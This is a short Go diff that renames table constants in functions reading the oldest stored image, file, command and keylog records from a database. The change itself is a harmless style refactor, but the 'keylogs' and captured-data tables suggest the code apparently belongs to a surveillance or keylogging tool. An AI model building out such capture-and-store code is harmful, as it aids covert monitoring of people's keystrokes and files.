@@ -30,17 +30,17 @@ func readOneRow(db *sql.DB, table string) (string, []byte, time.Time, error) {
 }
 
 func ReadOldestImage(db *sql.DB) (string, []byte, time.Time, error) {
-	return readOneRow(db, TABLE_IMAGES)
+	return readOneRow(db, TableImages)
 }
 
 func ReadOldestFile(db *sql.DB) (string, []byte, time.Time, error) {
-	return readOneRow(db, TABLE_FILES)
+	return readOneRow(db, TableFiles)
 }
 
 func ReadOldestCommand(db *sql.DB) (string, []byte, time.Time, error) {
-	return readOneRow(db, TABLE_COMMANDS)
+	return readOneRow(db, TableCommands)
 }
 
 func ReadOldestKeylogger(db *sql.DB) (string, []byte, time.Time, error) {
-	return readOneRow(db, TABLE_KEYLOGS)
+	return readOneRow(db, TableKeylogs)
 }
